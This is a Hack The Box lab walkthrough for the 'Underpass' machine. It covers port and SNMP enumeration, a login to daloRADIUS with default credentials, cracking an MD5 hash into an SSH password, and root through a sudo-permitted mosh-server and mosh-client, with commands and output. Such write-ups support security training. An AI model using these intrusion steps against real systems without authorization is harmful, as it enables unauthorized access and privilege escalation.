---
title: HTB - Underpass Notes
date: 2024-12-27
tags:
  - hackthebox
  - pentesting
  - easy
  - guide
---

Difficulty - Easy
Target - 10.10.11.48
### NMAP - Typical

```bash
nmap -sCV 10.10.11.48
```

``` NMAP Scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 11:30 EST
Nmap scan report for 10.10.11.48
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds
                                                                  
```

### Nmap - Top 100 UDP Ports

```Terminal
nmap 10.10.11.48 -sU --top-ports 100 -v 
```

```Nmap
PORT     STATE         SERVICE REASON
161/udp  open          snmp    udp-response ttl 63
1812/udp open|filtered radius  no-response
1813/udp open|filtered radacct no-response
```
### Port 80 TCP - Default Apache welcome page.

![[Screenshot 2024-12-27 at 16.31.22.png]]
Version = 2.4.52

Vulnerable to - CVE-2022-22720 ([[HTTP Request Smuggling]])

Uses HTTP 1.1 according to https://portswigger.net/web-security/request-smuggling this is the most prone to HTTP Request Smuggling.

### Port 161 UDP - SNMP

Looking further into this port. I do a NSE scan on the service.

```bash
nmap 10.10.11.48 -sU -p 161 --script="*snmp*" -A
```

```NMAP
	PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 29
|_  snmpEngineTime: 1h44m19s
| snmp-brute: 
|_  public - Valid credentials
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 1h44m21.00s (626100 timeticks)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   39.60 ms 10.10.14.1
2   39.91 ms 10.10.11.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.62 seconds
```

#### Metasploit - SNMP Scanner

```
use /auxillary/scanner/snmp/snmp_enum
```

After setting options, the result of the scan is...

```Metasploit 
Host IP                       : 10.10.11.48
Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 01:48:46.39
Uptime system                 : 01:48:36.40
System date                   : 2024-12-27 17:52:53.0
```

## http://underpass.htb/daloradius/app/operators/login.php

After some googling, it is apparent that daloradius login portal can be accessed using the above link.
![[Screenshot 2024-12-27 at 19.16.59.png]]

The default credentials are set and let me gain access `administrator:radius`.

![[Screenshot 2024-12-27 at 19.18.13.png]]
In the users tab, the follow details are shown.
![[Screenshot 2024-12-27 at 19.19.03.png]]
This password is a MD5 hash.

Using crack station, I was able to crack the hash.

![[Screenshot 2024-12-27 at 19.25.16.png]]

Credentials: `svcMosh:underwaterfriends`

## 10.10.11.48 - svcMosh

Using credentials `svcMosh:underwaterfriends`, I was able to SSH into the server.
![[Screenshot 2024-12-27 at 19.27.38.png]]
In user.txt was the first flag.
### Mosh-server

Using `sudo -l` I could see that svcMosh has NOPASSWD privileged  access to `mosh-server`.

``` sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

```

This meant that whatever this binary was, it could run as sudo.

After some research on mosh and mosh-server, I was able to conclude that mosh is a version of SSH that uses UDP aimed at technicians with poor network connections. Using mosh meant that they could still maintain a connection even with poor coverage.

Using mosh-server in a privileged way made a server and port as a connection.

```
sudo mosh-server
```

```

MOSH CONNECT 60001 0Jrovyz1UJqol3ppj/MuZw

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 5412]

```

Then, using mosh-client on the same instance, I was able to connect using the key `0Jrovyz1UJqol3ppj/MuZw` on UDP port `60001`.

```
MOSH_KEY=0Jrovyz1UJqol3ppj/MuZw mosh-client 127.0.0.1 60001
```

This gave me root access and the subsequent root flag .
